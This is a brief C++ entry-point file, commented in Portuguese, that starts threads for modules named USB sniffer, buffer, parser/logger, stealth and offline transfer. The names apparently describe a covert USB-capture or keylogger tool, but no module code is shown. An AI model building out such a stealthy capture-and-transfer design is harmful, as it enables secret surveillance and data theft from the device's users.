#include <thread>
#include "usb_sniffer/usb_sniffer.h"       // Parte 1
#include "buffer_inteligente/buffer.h"     // Parte 2
#include "parser_logger/parser.h"          // Parte 3
#include "stealth_health/stealth.h"        // Parte 4
#include "transferencia_offline/transfer.h"// Parte 5

int main() {
    // Inicialização de módulos
    init_usb_sniffer();   // Parte 1
    init_buffer();        // Parte 2
    init_parser();        // Parte 3
    init_stealth();       // Parte 4

    // Threads separadas para cada módulo
    std::thread t1(loop_usb_sniffer);           // Parte 1
    std::thread t2(loop_buffer_inteligente);    // Parte 2
    std::thread t3(loop_parser_logger);         // Parte 3
    std::thread t4(loop_stealth_health);        // Parte 4
    std::thread t5(loop_transfer_offline);      // Parte 5

    // Aguarda threads finalizarem (teoricamente nunca, loops infinitos)
    t1.join();
    t2.join();
    t3.join();
    t4.join();
    t5.join();

    return 0;
}